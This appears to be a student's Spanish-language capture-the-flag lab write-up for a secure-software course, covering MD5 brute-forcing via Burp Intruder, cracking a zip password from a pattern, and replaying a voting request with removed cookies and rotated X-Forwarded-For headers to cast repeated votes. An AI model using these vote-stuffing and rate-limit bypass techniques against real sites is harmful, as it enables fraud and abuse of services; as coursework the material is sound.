- Apagar la IA
En este caso primero desencriptamos los hash de ambos archivos MD5, nos da el resultado de 9995 y 9912

Se crea un script en Python para generar los hash MD5 de los números del 1 al 20000. En mi caso hice una copia del script compartido por el profesor, le pedi a la IA que me explique el paso a paso del código generado, ya que este ejercicio ya se había realizado en clases.
Una vez obtenido el archivo hashes.txt, se copia los mismos y se los envía al intruder de Burp Suite.
Se configura en settings para obtener el regex (<li>\d{16}</li>)
Una vez obtenido el código de 16 dígitos se encripta con MD5


- El mejor secreto
Descargoi ambos archivos
Al visualizar el video podemos determinar que la secuencia es a-b-cc-d-a-dddd-e-c
Se crea un script en python que genera todas las combinaciones posibles y las prueba en el archivo .zip
Se adjunta el script generado en el laboratorio y también el resultado para poder resolver el secreto.


- Votación
Para el laboratorio Votación https://chl-da4501f6-2b7e-4392-a70e-d0ae7c251992-votacion.softwareseguro.com.ar/
Se activa la intercepción en Burp Suite
Selecciono UTN y hago click en el botón Votar, lo que ejecuta el endpoit 

Tomo el endpoint POST
POST /src/ctl/votacion.ctl.php HTTP/2
Host: chl-da4501f6-2b7e-4392-a70e-d0ae7c251992-votacion.softwareseguro.com.ar
Cookie: PHPSESSID=c6682df60a72fd96af099714ec891937; voto=s8fvks7dk3ncq0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: es-AR,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 15
Origin: https://chl-da4501f6-2b7e-4392-a70e-d0ae7c251992-votacion.softwareseguro.com.ar
Referer: https://chl-da4501f6-2b7e-4392-a70e-d0ae7c251992-votacion.softwareseguro.com.ar/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

opUniversidad=1

Pruebo el envío repetido de la petición POST
Al quitar el set cookie, puedo repetir la petición sin problemas.
Modifico alguno de los datos que se envían, por ejemplo la versión de Firefox
Se envía por medio del Intruder para realizar la repetición de votos y completar el laboratorio

- Votación nueva versión
Para el laboratorio Votación Nueva Votación
Se activa la intercepción en Burp Suite
Selecciono UTN y hago click en el botón Votar, lo que ejecuta el endpoit 

POST /src/ctl/votacion.ctl.php HTTP/2
Host: chl-dec1e023-5a74-48b5-8799-dc1b4c74eaec-votacion-nueva-version.softwareseguro.com.ar
Cookie: cf_clearance=7FO.JY_q0fUAzFBmSFnfka8EeBW9H2d3zkZMUTdorQA-1790713916-1.2.1.1-72ONEl6W9VydUmtSM.HUCLBq_kXjW_XST7Z.zDusNF9HzhyJIIqyI23SVj0GwUV5EKCfHZL.7hdAAwcrZhg5NhFDYqP1hoCwOVpoH6O54XVZUujOwulhOQl2cg7fxvkrlxOXGbAt7Fikl0m2QE8qjSvNXrv49Q6QiZCFY5NPm8VLF0g47yUatuFc5SoMcizqCkxGPdhEBqGoHJkuFjEcGg2HPJCJb5rkhbwjlxW_QQ2uZMJwZa069ZZiaqcdBhkvXVeRKfdFsooiTasBB5AGpqNvYs3hhaEd.A6wR4uYj37h.z8fGrr2na.mgZkH8OEO_QiI.UQQnJ2gORn4b.Y5tQZg1666GeQDyo.El2MSUzA; PHPSESSID=e49e9a37b268c9a68c2df3bf18870945
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: es-AR,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 15
Origin: https://chl-dec1e023-5a74-48b5-8799-dc1b4c74eaec-votacion-nueva-version.softwareseguro.com.ar
Referer: https://chl-dec1e023-5a74-48b5-8799-dc1b4c74eaec-votacion-nueva-version.softwareseguro.com.ar/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

opUniversidad=1

Se agrega un header X-Forwarded-For: 190.129.129.255 y se modifica con el intruder la ip agregada
